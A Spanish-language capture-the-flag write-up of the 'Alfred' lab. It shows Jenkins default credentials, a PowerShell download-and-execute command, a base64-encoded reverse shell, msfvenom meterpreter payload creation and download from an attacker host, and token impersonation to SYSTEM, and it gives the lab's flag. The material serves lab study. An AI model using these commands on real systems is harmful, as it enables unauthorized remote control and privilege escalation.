# Alfred - rmartinez 17/01/2022


## 1. Initial access

IP: 10.10.229.196

### How many ports are open? (TCP only) 
```
3
```


### What is the username and password for the log in panel(in the format username:password)
```
admin:admin
```
-- Simplemente probando salen las credenciales

### Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port

### You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python: python3 -m http.server

```
Fácil, generamos una revshell desde revshells.com, en este caso una con Base64, se la pasamos a Jenkins y conseguimos establecer conexión con netcat. 

Comando utilizado:

powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOQAuADMALgAyADQAMQAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

# 2. Switching shells

En este paso vamos a actualizar nuestra reverse shell a una shell de meterpreter.

Para ello vamos a generar un payload de revshell con msfvenom.

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.3.241 LPORT=5555 -f exe -o shell.exe

```

Abrimos metasploit y usamos el handler multi para poder escuchar la sesión de meterpreter:

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.9.3.241
set LPORT 5555
run
```

Abrimos un webserver con python para hacer disponible la shell y nos la bajamos desde la revshell de netcat.

```
mkdir webserver
mv shell.exe webserver
cd webserver
python3 -m http.server
```

Nos bajamos en destino el ejecutable con la shell de meterpreter
```
powershell -command "(New-Object System.Net.WebClient).Downloadfile('http://10.9.3.241:8000/shell.exe','shell-name.exe')"
```

Ejecutamos el binario descargado
```
Start-Process shell-name.exe
```

Y listo, tenemos una sesión de meterpreter abierta

# 3. Privilege Escalation

Para escalar privilegios en esta máquina vamos a hacer provecho del privilegio SeImpersonatePrivilege que tiene el usuario alfred\bruce con el que tenemos la revshell.

Para ello vamos a listar los privilegios que tiene el usuario con 

```
whoami /priv
```
Y veremos que tiene dos privilegios importantes activos:
- SeImpersonatePrivilege
- SeDebugPrivilege

A nosotros nos interesa el primero. Lo que vamos a hacer es listar los tokens que podemos impersonar con el módulo incognito de metasploit. Para ello vamos a cargar el módulo y a ejecutar el siguiente comando:

```
load incognito
list_tokens -g
```

Y nos sacará diversos tokens. Nos interesa uno llamado "BUILTIN\Administrators". Lo que haremos será impersonar dicho token con:

```
impersonate_token "BUILTIN\Administrators"
```

Si ejecutamos getuid vemos que somos NT AUTHORITY\SYSTEM. Para finalizar la escalada de privilegios migraremos el proceso actual de meterpreter a services.exe, que por lo visto es un proceso bastante safe al que migrar:

```
meterpreter> ps

buscamos el PID de services.exe

meterpreter> migrate $PID

```

Y listo. Ya somos root, leemos la flag en C:\Windows\System32\config:

```
dff0f748678f280250f25a45b8046b4a
```